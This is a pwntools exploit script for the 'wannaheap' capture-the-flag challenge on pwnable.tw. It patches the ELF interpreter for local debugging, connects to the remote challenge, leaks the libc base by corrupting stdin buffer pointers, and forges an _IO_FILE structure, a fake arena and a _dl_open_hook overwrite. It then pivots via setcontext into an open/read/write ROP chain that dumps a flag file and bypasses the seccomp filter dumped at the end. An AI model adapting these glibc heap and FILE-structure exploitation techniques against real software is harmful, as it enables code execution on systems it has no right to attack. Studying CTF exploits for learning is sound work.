from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)


def add(key, data):
	p.recvuntil('>')
	p.send('A')
	p.recvuntil('key :')
	p.send(key)
	p.recvuntil('data :')
	p.send(data)

def read(key):
	p.recvuntil('>')
	p.send('R')
	p.recvuntil('key:')
	p.send(key)

while 1:
	debug = 0
	if debug == 1:
		elf = ELF('./wannaheap')
		libc = ELF('./libc.so')
		elf_1 = change_ld('./wannaheap', './ld-2.24.so')
		p = elf_1.process(env={'LD_PRELOAD':'./libc.so'})
		#p = process('./wannaheap')
		#gdb.attach(p)#, 'b *0x555555554000+0x1D39')
		path = b'./flag\x00'

	else:
		p = remote('chall.pwnable.tw', 10305)
		elf = ELF('./wannaheap')
		libc = ELF('./libc.so')
		path = b'/home/wannaheap/flag\x00'
	
	mmap_size = 0x314000
	stdin_struct_offset = libc.symbols['_IO_2_1_stdin_']
	stdin_buf_base_offset = stdin_struct_offset + 0x38
	stdin_lock_offset = stdin_struct_offset + 0x1eb0
	stdout_struct_offset = libc.symbols['_IO_2_1_stdout_']
	dl_open_hook_offset = libc.symbols['_dl_open_hook']
	IO_file_jumps_offset = libc.symbols['_IO_file_jumps']
	#null
	p.recvuntil('Size :')
	p.sendline(str(mmap_size - 0x10 + stdin_buf_base_offset))
	p.recvuntil('Size :')
	p.sendline(str(0x313370))
	p.recvuntil('Content :')
	p.send('kotori')
	try:
		#leak libc
		add('1\x4f', 'A' * 0x8)
		#0x4f00 - 0x4900 = 0x600
		add('2\x4f', 'A' * 0x9)
		#0 < _IO_buf_end - _IO_buf_base < 0x2000?
		read('2\x4f')
		p.recvuntil('A' * 0x8)
	except:
		#log.failure('failed')
		p.close()
	else:
		break




libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x3c2641
log.success('libc_base: ' + hex(libc_base))

#gdb.attach(p, 'b *' + hex(libc_base + 0x6ebbb))
#sleep(1)

#p.send('R')
#p.send(p64(libc_base+stdin_buf_base_offset+0x1200))

io_file_struct = p64(libc_base + libc.symbols['__malloc_hook'] + 0xa0)\
				+p64(0)\
				+'A1234567'\
				#make get_c correct
				+p64(0) * 4\
				+p64(0xffffffffffffffff)\
				+p64(0)\
				+p64(libc_base + stdin_struct_offset + 0x1eb0)\
				+p64(0xffffffffffffffff)\
				+p64(0)\
				+p64(libc_base + stdin_struct_offset + 0xe0)\
				+p64(0) * 3\
				+p64(0x00000000ffffffff)\
				+p64(0) * 2\
				+p64(libc_base + stdin_struct_offset - 0x34c0)
#ROPgadget
L_nop = 0x10f80
L_pop_rdi = 0x1fd7a
L_pop_rsi = 0x1fcbd
L_pop_rdx = 0x1b92
L_pop_rax = 0x3a998
L_syscall = 0xbc765
#setcontext_gadget = 0x48010 + 0x33
setcontext_gadget = 0x48010 + 0x35
L_set_call = 0x6ebbb  # mov rdi, rax ; call [rax+0x20]

fake_chunk_head = p64(0) + p64(0x110)\
			+p64(libc_base + dl_open_hook_offset - 0x10)\
			+p64(libc_base + dl_open_hook_offset - 0x10)

rop_chain = p64(libc_base + L_pop_rdi) + p64(libc_base + stdin_struct_offset + 0x1d8)\
           +p64(libc_base + L_pop_rsi) + p64(0)\
           +p64(libc_base + L_pop_rdx) + p64(0)\
           +p64(libc_base + L_pop_rax) + p64(2)\
           +p64(libc_base + L_syscall)\
           +p64(libc_base + L_pop_rdi) + p64(1)\
			#remote open file with fd = 1
           +p64(libc_base + L_pop_rsi) + p64(libc_base + stdin_struct_offset + 0x1d8)\
           +p64(libc_base + L_pop_rdx) + p64(0x100)\
           +p64(libc_base + L_pop_rax) + p64(0)\
           +p64(libc_base + L_syscall)\
           +p64(libc_base + L_pop_rdi) + p64(0)\
           +p64(libc_base + L_pop_rsi) + p64(libc_base + stdin_struct_offset + 0x1d8)\
           +p64(libc_base + L_pop_rdx) + p64(0x100)\
           +p64(libc_base + L_pop_rax) + p64(1)\
           +p64(libc_base + L_syscall)

fake_chunk = fake_chunk_head + rop_chain + path
fake_chunk = fake_chunk.ljust(0x110, '\x00')

fake_main_arena = p64(0x0000000100000000)\
				+ p64(0) * 10\
				+ p64(libc_base + L_set_call)\
				+ p64(0)\
				+ p64(libc_base + stdin_struct_offset + 0xe0)\
				+ p64(libc_base + stdin_struct_offset + 0xe0)

fake_frame = p64(libc_base + setcontext_gadget)\
			+p64(0)*15\
			+p64(libc_base + stdin_struct_offset + 0x100)\
			+p64(libc_base + L_nop)

payload = (io_file_struct + fake_chunk).ljust(0x200, '\x00') + fake_main_arena + fake_frame


p.send(payload)

p.interactive()

'''
 line  CODE  JT   JF      K
=======
 0000:  A = arch
 0001:  if (A == ARCH_X86_64) goto 0003
 0002:  return KILL
 0003:  A = sys_number
 0004:  if (A != rt_sigreturn) goto 0006
 0005:  return ALLOW
 0006:  if (A != exit_group) goto 0008
 0007:  return ALLOW
 0008:  if (A != exit) goto 0010
 0009:  return ALLOW
 0010:  if (A != open) goto 0012
 0011:  return ALLOW
 0012:  if (A != read) goto 0014
 0013:  goto 0025
 0014:  if (A != write) goto 0016
 0015:  return ALLOW
 0016:  if (A != writev) goto 0018
 0017:  return ALLOW
 0018:  if (A != close) goto 0020
 0019:  return ALLOW
 0020:  if (A != mmap) goto 0022
 0021:  goto 0038
 0022:  if (A != munmap) goto 0024
 0023:  return ALLOW
 0024:  return KILL
 0025:  goto 0026
 0026:  A = count # read(fd, buf, count)
 0027:  mem[0] = A
 0028:  A = count >> 32 # read(fd, buf, count)
 0029:  mem[1] = A
 0030:  if (A > 0x0) goto 0035
 0031:  if (A != 0x0) goto 0037
 0032:  A = mem[0]
 0033:  if (A <= 0x1337) goto 0036
 0034:  A = mem[1]
 0035:  return KILL
 0036:  A = mem[1]
 0037:  return ALLOW
 0038:  goto 0039
 0039:  A = prot # mmap(addr, len, prot, flags, fd, pgoff)
 0040:  mem[0] = A
 0041:  A = prot >> 32 # mmap(addr, len, prot, flags, fd, pgoff)
 0042:  mem[1] = A
 0043:  A = mem[0]
 0044:  A &= 0x4
 0045:  if (A != 0) goto 0047
 0046:  return ALLOW
 0047:  return KILL
'''